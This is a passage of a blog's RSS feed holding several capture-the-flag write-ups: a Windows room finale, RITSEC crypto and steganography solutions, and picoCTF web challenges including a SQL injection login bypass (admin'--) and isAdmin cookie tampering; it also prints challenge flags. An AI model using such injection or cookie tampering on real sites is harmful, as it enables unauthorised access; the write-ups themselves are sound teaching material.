</span></span><span class="line"><span class="cl">12/12/2018  10:13 PM    &lt;DIR&gt;          Pictures
</span></span><span class="line"><span class="cl">12/12/2018  10:13 PM    &lt;DIR&gt;          Saved Games
</span></span><span class="line"><span class="cl">12/12/2018  10:13 PM    &lt;DIR&gt;          Searches
</span></span><span class="line"><span class="cl">12/12/2018  10:13 PM    &lt;DIR&gt;          Videos
</span></span><span class="line"><span class="cl">               <span class="m">0</span> File<span class="o">(</span>s<span class="o">)</span>              <span class="m">0</span> bytes
</span></span><span class="line"><span class="cl">              <span class="m">13</span> Dir<span class="o">(</span>s<span class="o">)</span>  20,619,608,064 bytes free
</span></span></code></pre></td></tr></table>
</div>
</div><p>Mh nothing?</p>
<p>Let&rsquo;s take a look at his documents.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\J</span>on&gt;dir Documents
</span></span><span class="line"><span class="cl">dir Documents
</span></span><span class="line"><span class="cl"> Volume in drive C has no label.
</span></span><span class="line"><span class="cl"> Volume Serial Number is E611-0B66
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Directory of C:<span class="se">\U</span>sers<span class="se">\J</span>on<span class="se">\D</span>ocuments
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">12/12/2018  10:49 PM    &lt;DIR&gt;          .
</span></span><span class="line"><span class="cl">12/12/2018  10:49 PM    &lt;DIR&gt;          ..
</span></span><span class="line"><span class="cl">03/17/2019  02:26 PM                <span class="m">37</span> flag3.txt
</span></span><span class="line"><span class="cl">               <span class="m">1</span> File<span class="o">(</span>s<span class="o">)</span>             <span class="m">37</span> bytes
</span></span><span class="line"><span class="cl">               <span class="m">2</span> Dir<span class="o">(</span>s<span class="o">)</span>  20,619,608,064 bytes free
</span></span></code></pre></td></tr></table>
</div>
</div><p>Gotcha! There is our third flag!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\J</span>on&gt;cd Documents
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> Documents
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\J</span>on<span class="se">\D</span>ocuments&gt;type flag3.txt
</span></span><span class="line"><span class="cl"><span class="nb">type</span> flag3.txt
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>admin_documents_can_be_valuable<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We managed to get the third and last flag
and thus successfully completed this room!</p>
<p><strong>Thanks for tuning in!</strong></p>
]]></description></item><item><title>RITSEC CTF - Crypto - Lost In</title><link>https://blog.ppeinecke.de/posts/ritsecctf-crypto-lost-in/</link><pubDate>Thu, 07 Apr 2022 17:54:54 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/ritsecctf-crypto-lost-in/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/ritsecCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="crypto---lost-in---writeup">Crypto - Lost in - writeup</h1>
<h2 id="description">description</h2>
<p>324c6e597364696f3259725a6f646d673261453d</p>
<p>Bingus sent us this encrypted messagen</p>
<p>Can you decrypt?</p>
<h2 id="writeup">writeup</h2>
<p>this is the message we got:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">324c6e597364696f3259725a6f646d673261453d
</span></span></code></pre></td></tr></table>
</div>
</div><p>this looks to be hex let&rsquo;s translate that hex string to ascii:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">2LnYsdio2YrZodmg2aE=
</span></span></code></pre></td></tr></table>
</div>
</div><p>The = at the end most probably means that this is base64</p>
<p>If I try to decode this from base64 I get this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
</span></span></code></pre></td></tr></table>
</div>
</div><p>this is Arabic.</p>
<p>Once I try to use google translate to translate this to English I get this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Arabic101 
</span></span></code></pre></td></tr></table>
</div>
</div><p>All that is left is to wrap it with the flag format!</p>
<p>The final flag is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">RS{Arabic101}
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>RITSEC CTF - Misc - Stegwalk</title><link>https://blog.ppeinecke.de/posts/ritsecctf-misc-stegwalk/</link><pubDate>Thu, 07 Apr 2022 17:51:01 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/ritsecctf-misc-stegwalk/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/ritsecCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="misc---stegwalk---writeup">Misc - Stegwalk - writeup</h1>
<h2 id="description">description</h2>
<p>We found these files in storage. We think there might be
something more to one of these featuredImages. Good luck!</p>
<h2 id="writeup">writeup</h2>
<p>Ok so I first downloaded the file &lsquo;StegWalk.zip&rsquo;</p>
<p>Let&rsquo;s move it for our convenience.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mv ~/Downloads/StegWalk.zip .
</span></span></code></pre></td></tr></table>
</div>
</div><p>I am going to extract the file first</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">unzip StegWalk.zip -d StegWalk
</span></span></code></pre></td></tr></table>
</div>
</div><p>Inside this zip archive are a dozen of .png files &hellip;</p>
<p>Most of these featuredImage files just say &lsquo;Nothing&rsquo;.</p>
<p>But looking at the file sizes of the files I can see that all
files have the size 2150 bytes except the file &lsquo;iyav473h.png&rsquo;
which is 110436 bytes in size.</p>
<p>After opening that particular file I see some sort of ancient map.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">file iyav473h.png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">iyav473h.png: JPEG featuredImage data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 991x991, components <span class="m">3</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After trying to extract files from the featuredImage using cyberchef I found
a zip archive &rsquo;extracted_at_0x1adc4.zip'</p>
<p>Inside this zip archive is a folder called &lsquo;secret&rsquo;</p>
<p>I already had seen that folder while looking at the hexcode of the featuredImage bytes.</p>
<p>Inside of that folder is a file called &lsquo;secret.txt&rsquo;</p>
<p>Let&rsquo;s see what is inside there &hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat secret.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nothing here... or is there?                                                
</span></span><span class="line"><span class="cl">                                                                          
</span></span><span class="line"><span class="cl">                                                                           
</span></span><span class="line"><span class="cl">                                                                           
</span></span><span class="line"><span class="cl">                                                                           
</span></span><span class="line"><span class="cl">                                                                         
</span></span><span class="line"><span class="cl">                     
</span></span></code></pre></td></tr></table>
</div>
</div><p>Mh a lot of whitespace.</p>
<p>Chances are high this could be some sort of whitespace steganography
or zero width space steganography &hellip;.</p>
<p>Let&rsquo;s try to decode it using stegsnow &hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">stegsnow -C secret.txt output.txt
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat output.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">RS<span class="o">{</span>st3g0_w4lk_432849<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is our flag!</p>
]]></description></item><item><title>RITSEC CTF - Misc - Scrumptions Snacks</title><link>https://blog.ppeinecke.de/posts/ritsecctf-misc-scrumptions-snacks/</link><pubDate>Thu, 07 Apr 2022 17:44:03 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/ritsecctf-misc-scrumptions-snacks/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/ritsecCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="misc---scrumptions-snacks---writeup">Misc - Scrumptions Snacks - writeup</h1>
<h2 id="description">description</h2>
<p>Sheamus the STEGOsaurus is hungry!
He&rsquo;s somewhat secretive about his favorite snack spot, but he&rsquo;ll gladly share his secret if you say the word: &ldquo;lunch&rdquo;.
Can you identify the name of Sheamus&rsquo; favorite food establishment?</p>
<h2 id="writeup">writeup</h2>
<p>So I first downloaded the file &lsquo;stegosaurus.jpg&rsquo;.</p>
<p>Let&rsquo;s see what we have here:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mv ~/Downloads/stegosaurus.jpg .
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">file stegosaurus.jpg 
</span></span><span class="line"><span class="cl">stegosaurus.jpg: JPEG featuredImage data, JFIF standard 1.01, resolution <span class="o">(</span>DPI<span class="o">)</span>, density 168x168, segment length 16, baseline, precision 8, 964x910, components <span class="m">3</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>It is a JPEG file so steganography is possible.</p>
<p>According to stegdetect there is no steganography hidden in here &hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">stegdetect ./stegosaurus.jpg 
</span></span><span class="line"><span class="cl">./stegosaurus.jpg : negative
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ok so that does not lead to anything &hellip;.</p>
<p>In the task description there stands:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">He&#39;s somewhat secretive about his favorite snack spot, but he&#39;ll gladly share his secret if you say the word: &#34;lunch&#34;.
</span></span></code></pre></td></tr></table>
</div>
</div><p>So I tried to extract any steganography using steghide with the password &rsquo;lunch'</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">steghide extract -sf stegosaurus.jpg -p lunch -xf solved.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>The extracted data was written to a file &lsquo;solved.txt&rsquo;</p>
<p>let&rsquo;s see what&rsquo;s inside !</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat solved.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">39.95187791397735, -75.17117334360019
</span></span></code></pre></td></tr></table>
</div>
</div><p>Mhh &hellip; What is that?</p>
<p>I suppose these have to be the coordinates of his favorite snack spot!</p>
<p>Let&rsquo;s fire up google maps and input the above coordinates!</p>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>I found this:</p>
<p></p>
<p>On that google maps page I found this featuredImage:</p>
<p></p>
<p>The establishment seems to be called &lsquo;sweetgreen&rsquo;</p>
<p>So the flag is</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">RS{sweetgreen}
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>picoCTF - Web Exploitation - SQLiLite</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-sqlilite/</link><pubDate>Wed, 06 Apr 2022 16:12:40 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-sqlilite/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="web-exploitation---sqlilite---writeup">Web Exploitation - SQLiLite - writeup</h1>
<h2 id="description">description</h2>
<p>Can you login to this website?</p>
<p>Try to login <!-- raw HTML omitted -->here<!-- raw HTML omitted -->.</p>
<h2 id="writeup">writeup</h2>
<p>Once i visit the website <!-- raw HTML omitted --><a href="http://saturn.picoctf.net:60431/" target="_blank" rel="noopener noreffer">http://saturn.picoctf.net:60431/</a><!-- raw HTML omitted -->
in firefox I can see a login form with a username and a password field.</p>
<p>My first attempt was to use the username &lsquo;admin&rsquo;
and try a basic sql injection.</p>
<p>So I input in the username field this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#39;--
</span></span></code></pre></td></tr></table>
</div>
</div><p>the single quote is here to end the input of the text box.</p>
<p>The double dash (&ndash;) is here to comment out the rest of the sql query
so we can skip the password check.</p>
<p>Once I try to login using this method I get redirected to a page with the following content:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username: admin&#39;--
</span></span><span class="line"><span class="cl">password: 
</span></span><span class="line"><span class="cl">SQL query: SELECT * FROM users WHERE name=&#39;admin&#39;--&#39; AND password=&#39;&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Logged in! But can you see the flag, it is in plainsight.
</span></span></code></pre></td></tr></table>
</div>
</div><p>But looking at the html code reveals the flag pretty quickly:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span> <span class="na">hidden</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_8dac17f1}<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>So the flag is</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{L00k5_l1k3_y0u_solv3d_it_8dac17f1}
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>picoCTF - Web Exploitation - SQL Direct</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-sql-direct/</link><pubDate>Wed, 06 Apr 2022 16:10:25 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-sql-direct/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="web-exploitation---sql-direct---writeup">Web Exploitation - SQL Direct - writeup</h1>
<h2 id="description">description</h2>
<p>Connect to this PostgreSQL server and find the flag!</p>
<p>psql -h saturn.picoctf.net -p 49248 -U postgres pico</p>
<p>Password is postgres</p>
<h2 id="writeup">writeup</h2>
<p>Ok let&rsquo;s first connect to the database server:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">psql -h saturn.picoctf.net -p <span class="m">49248</span> -U postgres pico 
</span></span></code></pre></td></tr></table>
</div>
</div><p>the password is &lsquo;postgres&rsquo;</p>
<p>Let&rsquo;s list all databases first</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">pico</span><span class="o">=</span><span class="c1"># \l</span>
</span></span><span class="line"><span class="cl">                                 List of databases
</span></span><span class="line"><span class="cl">   Name    <span class="p">|</span>  Owner   <span class="p">|</span> Encoding <span class="p">|</span>  Collate   <span class="p">|</span>   Ctype    <span class="p">|</span>   Access privileges   
</span></span><span class="line"><span class="cl">-----------+----------+----------+------------+------------+-----------------------
</span></span><span class="line"><span class="cl"> pico      <span class="p">|</span> postgres <span class="p">|</span> UTF8     <span class="p">|</span> en_US.utf8 <span class="p">|</span> en_US.utf8 <span class="p">|</span> 
</span></span><span class="line"><span class="cl"> postgres  <span class="p">|</span> postgres <span class="p">|</span> UTF8     <span class="p">|</span> en_US.utf8 <span class="p">|</span> en_US.utf8 <span class="p">|</span> 
</span></span><span class="line"><span class="cl"> template0 <span class="p">|</span> postgres <span class="p">|</span> UTF8     <span class="p">|</span> en_US.utf8 <span class="p">|</span> en_US.utf8 <span class="p">|</span> <span class="o">=</span>c/postgres          +
</span></span><span class="line"><span class="cl">           <span class="p">|</span>          <span class="p">|</span>          <span class="p">|</span>            <span class="p">|</span>            <span class="p">|</span> <span class="nv">postgres</span><span class="o">=</span>CTc/postgres
</span></span><span class="line"><span class="cl"> template1 <span class="p">|</span> postgres <span class="p">|</span> UTF8     <span class="p">|</span> en_US.utf8 <span class="p">|</span> en_US.utf8 <span class="p">|</span> <span class="o">=</span>c/postgres          +
</span></span><span class="line"><span class="cl">           <span class="p">|</span>          <span class="p">|</span>          <span class="p">|</span>            <span class="p">|</span>            <span class="p">|</span> <span class="nv">postgres</span><span class="o">=</span>CTc/postgres
</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="m">4</span> rows<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Connect to the &lsquo;pico&rsquo; database</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">pico</span><span class="o">=</span><span class="c1"># \c pico</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>List all tables</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">pico</span><span class="o">=</span><span class="c1"># \dt</span>
</span></span><span class="line"><span class="cl">         List of relations
</span></span><span class="line"><span class="cl"> Schema <span class="p">|</span> Name  <span class="p">|</span> Type  <span class="p">|</span>  Owner   
</span></span><span class="line"><span class="cl">--------+-------+-------+----------
</span></span><span class="line"><span class="cl"> public <span class="p">|</span> flags <span class="p">|</span> table <span class="p">|</span> postgres
</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="m">1</span> row<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>the table &lsquo;flags&rsquo; sounds interesting &hellip;</p>
<p>lets look at the contents:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">pico</span><span class="o">=</span><span class="c1"># select * from flags;</span>
</span></span><span class="line"><span class="cl"> id <span class="p">|</span> firstname <span class="p">|</span> lastname  <span class="p">|</span>                address                 
</span></span><span class="line"><span class="cl">----+-----------+-----------+----------------------------------------
</span></span><span class="line"><span class="cl">  <span class="m">1</span> <span class="p">|</span> Luke      <span class="p">|</span> Skywalker <span class="p">|</span> picoCTF<span class="o">{</span>L3arN_S0m3_5qL_t0d4Y_a26695df<span class="o">}</span>
</span></span><span class="line"><span class="cl">  <span class="m">2</span> <span class="p">|</span> Leia      <span class="p">|</span> Organa    <span class="p">|</span> Alderaan
</span></span><span class="line"><span class="cl">  <span class="m">3</span> <span class="p">|</span> Han       <span class="p">|</span> Solo      <span class="p">|</span> Corellia
</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="m">3</span> rows<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is our flag.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{L3arN_S0m3_5qL_t0d4Y_a26695df}
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>picoCTF - Web Exploitation - Search source</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-search-source/</link><pubDate>Wed, 06 Apr 2022 16:08:45 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-search-source/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="web-exploitation---search-source---writeup">Web Exploitation - Search Source - writeup</h1>
<h2 id="description">description</h2>
<p>The developer of this website mistakenly left an
important artifact in the website source, can you find it?
The website is <!-- raw HTML omitted -->here<!-- raw HTML omitted --></p>
<h2 id="writeup">writeup</h2>
<p>I was not able to find anything interesting on the website
by just looking at the source code in the browser.</p>
<p>So let&rsquo;s clone the website first using HTTrack so we can
take a look at the full source.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">httrack http://saturn.picoctf.net:64200/
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s use grep recursively to find the flag inside all
of the files of the webroot.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">grep -nr <span class="s1">&#39;picoCTF*&#39;</span> .
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">./css/style.css:328:/** banner_main picoCTF<span class="o">{</span>1nsp3ti0n_0f_w3bpag3s_3003ba70<span class="o">}</span> **/
</span></span></code></pre></td></tr></table>
</div>
</div><p>We found the flag inside the file css/style.css on line 328.</p>
<p>Flag:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{1nsp3ti0n_0f_w3bpag3s_3003ba70}
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>picoCTF - Web Exploitation - Power Cookie</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-power-cookie/</link><pubDate>Wed, 06 Apr 2022 16:04:26 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-power-cookie/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="web-exploitation---power-cookie---writeup">Web Exploitation - Power Cookie - writeup</h1>
<h2 id="description">description</h2>
<p>Can you get the flag? Go to this <!-- raw HTML omitted -->website<!-- raw HTML omitted -->
and see what you can discover.</p>
<h2 id="writeup">writeup</h2>
<p>Looking at the check.php function I can see that it requests a cookie &lsquo;isAdmin&rsquo;.</p>
<p>That cookie is not present at the first visit of the page.</p>
<p>So lets refresh the webpage.</p>
<p>Now the cookie is present.</p>
<p>The value of this particuluar cookie is &lsquo;0&rsquo; currently.</p>
<p>So lets change it to &lsquo;1&rsquo; and refresh the page once more.</p>
<p>I am immediately presented with the flag:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{gr4d3_A_c00k13_1d871e17}
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>picoCTF - Web Exploitation - Local Authority</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-local-authority/</link><pubDate>Wed, 06 Apr 2022 15:58:43 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-local-authority/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
